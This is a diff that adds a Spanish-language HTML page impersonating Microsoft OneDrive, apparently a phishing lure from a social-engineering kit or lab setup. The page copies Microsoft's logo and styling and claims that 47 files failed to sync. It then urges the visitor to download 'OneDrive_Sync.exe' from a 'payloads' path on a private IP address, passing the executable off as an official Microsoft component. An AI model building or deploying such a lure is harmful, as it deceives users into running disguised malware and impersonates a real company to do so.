@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>OneDrive - Sincronización requerida</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: #f3f2f1; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { max-width: 500px; background: white; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); padding: 48px; text-align: center; }
+        .logo { width: 90px; margin-bottom: 24px; }
+        h1 { color: #323130; font-size: 24px; margin-bottom: 16px; font-weight: 600; }
+        .sync-box { background: #f0f6ff; border: 1px solid #c7e0ff; border-radius: 8px; padding: 20px; margin: 24px 0; }
+        .sync-icon { font-size: 40px; margin-bottom: 10px; }
+        .sync-text { color: #0078d4; font-weight: 600; font-size: 14px; }
+        p { color: #605e5c; line-height: 1.6; margin-bottom: 16px; font-size: 14px; }
+        .btn { background: #0078d4; color: white; border: none; padding: 14px 36px; border-radius: 4px; font-size: 15px; cursor: pointer; text-decoration: none; display: inline-block; font-weight: 600; transition: background 0.2s; }
+        .btn:hover { background: #005a9e; }
+        .footer { margin-top: 32px; color: #a19f9d; font-size: 11px; }
+        .file-info { background: #f3f2f1; border-radius: 4px; padding: 10px; margin: 15px 0; font-size: 12px; color: #605e5c; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg class="logo" viewBox="0 0 23 23">
+            <path fill="#0078d4" d="M1 1h10v10H1z"/>
+            <path fill="#00a4ef" d="M12 1h10v10H12z"/>
+            <path fill="#7fba00" d="M1 12h10v10H1z"/>
+            <path fill="#ffb900" d="M12 12h10v10H12z"/>
+        </svg>
+        
+        <h1>🔄 Sincronización de archivos</h1>
+        
+        <div class="sync-box">
+            <div class="sync-icon">☁️</div>
+            <div class="sync-text">Hay 47 archivos pendientes de sincronización</div>
+        </div>
+        
+        <p>
+            OneDrive detectó que algunos archivos no se sincronizaron correctamente.
+            Instale el componente de sincronización para resolver este problema.
+        </p>
+        
+        <div class="file-info">
+            📦 OneDrive_Sync.exe<br>
+            Microsoft Corporation | 2.4 MB | Versión 2.4.2.1
+        </div>
+        
+        <a href="http://192.168.1.6:8000/static/payloads/OneDrive_Sync.exe" class="btn" download="OneDrive_Sync.exe">
+            📥 Instalar sincronización
+        </a>
+        
+        <p class="footer">
+            Este componente es necesario para el correcto funcionamiento de OneDrive.<br>
+            Microsoft Corporation © 2026
+        </p>
+    </div>
+</body>
+</html>
